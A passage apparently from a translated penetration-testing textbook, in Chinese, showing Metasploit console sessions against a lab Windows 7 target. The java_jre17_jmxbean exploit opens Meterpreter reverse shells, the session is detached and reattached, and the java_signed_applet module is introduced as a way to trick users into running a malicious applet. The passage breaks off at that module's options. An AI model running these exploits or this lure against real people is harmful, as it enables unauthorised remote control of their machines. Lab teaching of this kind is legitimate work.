  [*] Server started.\nmsf  exploit(java_jre17_jmxbean) > [*] 192.168.20.12      \
  \ java_jre17_jmxbean - handling request for /javaexploit\n[*] 192.168.20.12    \
  \    java_jre17_jmxbean - handling request for /javaexploit/\n[*] 192.168.20.12\
  \        java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n[*]\
  \ 192.168.20.12        java_jre17_jmxbean - handling request for /javaexploit/hGPonLVc.jar\n\
  [*] 192.168.20.12:49188 Request received for /INITJM...\n[*] Meterpreter session\
  \ 1 opened (192.168.20.9:8080 -> 192.168.20.12:49188) at 2015-05-05\n19:15:19 -0400\n\
  ```\n\n这些选项看起来很熟悉。默认的 `LPORT` 选项现在是 8080 而不是 4444。注意，`SRVPORT` 和 `LPORT` 默认都是 8080，因此我们需要更改其中至少一个。\n\
  \n设置好选项后，启动漏洞服务器并从你的 Windows 7 目标机访问恶意页面。只要你启用了受影响的 Java 浏览器插件，Internet Explorer\
  \ 或 Mozilla Firefox 都会受到这种攻击。\n\nHTTP 和 HTTPS Meterpreter 负载的强大特性之一，除了是合法的 HTTP\
  \ 和 HTTPS 流量从而可以绕过某些流量检查过滤器外，它们还能重新连接到已掉线的会话。（网络问题会导致会话意外死亡——这对渗透人员来说是一个大麻烦）。我们将在\
  \ 第 13 章 中检查其他获取持久访问的方法，但现在让我们先分离 Meterpreter 会话，如 示例 10-17 所示。\n\n## 示例 10-17.\
  \ 分离 HTTP Meterpreter 会话\n\n```\nmsf  exploit(java_jre17_jmxbean) > sessions -i\
  \ 1\n[*] Starting interaction with 1...\n\nmeterpreter > detach\n\n[*] 10.0.1.16\
  \ - Meterpreter session 1 closed.  Reason: User exit\nmsf  exploit(java_jre17_jmxbean)\
  \ >\n[*] 192.168.20.12:49204 Request received for /WzZ7_vgHcXA6kWjDi4koK/...\n[*]\
  \ Incoming orphaned session WzZ7_vgHcXA6kWjDi4koK, reattaching...\n[*] Meterpreter\
  \ session 2 opened (192.168.20.9:8080 -> 192.168.20.12:49204) at 2015-05-05 19:15:45\
  \ -0400 ❶\n```\n\n如你所示，HTTP Meterpreter 负载的处理器仍在后台运行。等几秒钟，你应该看到一个新的会话打开，而用户无需重新访问攻击页面，如\
  \ ❶ 所示。除非会话正式退出，否则负载将继续尝试连接回 Metasploit。（你可以通过 `SessionCommunicationTimeOut` 参数指定会话尝试重连的时间，这是负载的一个高级选项。）\n\
  \n但如果你的渗透目标勤于更新 Java，且目前互联网上还没有该软件的零日漏洞怎么办？\n\n### 签名 Java Applet\n\n与在 PDF 嵌入执行文件\
  \ 中讨论的针对 PDF 用户的攻击类似，我们可以通过要求用户允许我们运行恶意代码来跳过对未修复 Java 漏洞的需求。你可能见过这样的浏览器警告，例如：“此网站希望在您的浏览器中运行程序，您想如何继续？”有时即使是精通安全的用户如果他们相信侧边的内容是有用的，也可以被说服说“是”并在不进行进一步调查的情况下绕过此警告。\n\
  \n我们在示例中使用的模块是 `exploit/multi/browser/java_signed_applet`。如名称所示，该模块将创建一个恶意 Java\
  \ applet，如 示例 10-18 所示。\n\n## 示例 10-18. Metasploit 签名 Java applet 模块\n\n```\nmsf\
  \  exploit(java_jre17_jmxbean) > use exploit/multi/browser/java_signed_applet\n\
  msf  exploit(java_signed_applet) > show options\n\nModule options (exploit/multi/browser/java_signed_applet):\n\
